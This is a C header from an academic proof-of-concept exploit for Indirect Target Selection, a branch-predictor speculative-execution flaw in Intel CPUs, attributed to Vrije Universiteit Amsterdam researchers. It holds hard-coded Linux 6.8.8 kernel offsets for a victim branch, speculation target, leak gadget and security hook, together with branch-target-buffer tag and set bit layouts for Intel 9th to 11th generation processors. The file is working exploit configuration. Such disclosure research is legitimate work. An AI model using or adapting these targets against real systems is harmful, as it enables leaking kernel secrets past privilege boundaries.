/*
 * End-to-end ITS (Indirect Target Selection) exploit via cBPF
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#ifndef _TARGETS_H_
#define _TARGETS_H_

#define THR 80

#define PATH_PHYS_MAP "/proc/intra_its_help/phys_map_start"
#define PATH_LAST_MAPPED_MODULE "/proc/intra_its_help/last_mapped_module_region"


#define SECRET_ADDRESS_OFFSET 0xac
#define BASE_ADDRESS_OFFSET 0x8
                                                          // If KASLR disabled:
#define VICTIM_BRANCH_PC_OFFSET 0x6df09b                  // 0xffffffff816df09b
#define SPECULATION_TARGET_PC_OFFSET 0x6df125             // 0xffffffff816df125
#define LEAK_GADGET_PC_OFFSET 0x2acd97

// Static address we want to evict
// https://elixir.bootlin.com/linux/v6.8.8/source/security/security.c#L2804
// https://elixir.bootlin.com/linux/v6.8.8/source/include/linux/lsm_hook_defs.h#L177
#define MMAP_FILE_HOOK_PC_OFFSET            0x1d49540     // 0xffffffff82d49540
// And the first entry of the function list (is also static):
#define MMAP_FILE_HOOK_FIRST_ENTRY_PC_OFFSET 0x1d490f0    // 0xffffffff82d490f0

#define LEAK_CORE 1
#define IDLE_CORE 2

#ifdef INTEL_11_GEN

    // [23:14]
    #define TAG_PART_1_START 14
    #define TAG_PART_1_END   23

    // [33:24]
    #define TAG_PART_2_START 24
    #define TAG_PART_2_END   33

    // [13:5]
    #define SET_START 5
    #define SET_END 13

    #define N_SHORT_BITS 12

    #define BTB_CONTENTION_SET_SIZE 4


#elif defined(INTEL_10_GEN) || defined(INTEL_9_GEN)

    // [21:14]
    #define TAG_PART_1_START 14
    #define TAG_PART_1_END   21

    // [22:29]
    #define TAG_PART_2_START 22
    #define TAG_PART_2_END   29

    // [13:5]
    #define SET_START 5
    #define SET_END 13

    #define N_SHORT_BITS 10

    #define BTB_CONTENTION_SET_SIZE 4

#else
    #error "Not supported micro-architecture"
    // silence undefined errors
    #define TAG_PART_1_START 1
    #define TAG_PART_1_END 1
    #define TAG_PART_2_START 1
    #define TAG_PART_2_END   1
    #define SET_START 1
    #define SET_END 1
    #define N_SHORT_BITS 1
    #define BTB_CONTENTION_SET_SIZE 1
#endif

#define TAG_MASK_PART_1 (((1LLU << (TAG_PART_1_END - TAG_PART_1_START + 1)) - 1) << (TAG_PART_1_START))
#define TAG_MASK_PART_2 (((1LLU << (TAG_PART_2_END - TAG_PART_2_START + 1)) - 1) << (TAG_PART_2_START))

#define SET_MASK (((1LLU << (SET_END - SET_START + 1)) - 1) << (SET_START))

#define TAG_SET_MASK (TAG_MASK_PART_1 | TAG_MASK_PART_2 | SET_MASK)

#define SHORT_BITS_MASK  ((1LLU << N_SHORT_BITS) - 1)


static uint64_t get_tag_for_address(uint64_t address) {
    uint64_t part1 = ((uint64_t) (address) & TAG_MASK_PART_1) >> (TAG_PART_1_START);
    uint64_t part2 = ((uint64_t) (address) & TAG_MASK_PART_2) >> (TAG_PART_2_START);
    return (part1 ^ part2);

}

static uint64_t get_set_for_address(uint64_t address) {
    return ((((uint64_t) address) & SET_MASK) >> (SET_START));
}

static uint64_t get_offset_for_address(uint64_t address) {
    return (((uint64_t) address) & ((1LU << 6) - 1));
}


#endif //_TARGETS_H_
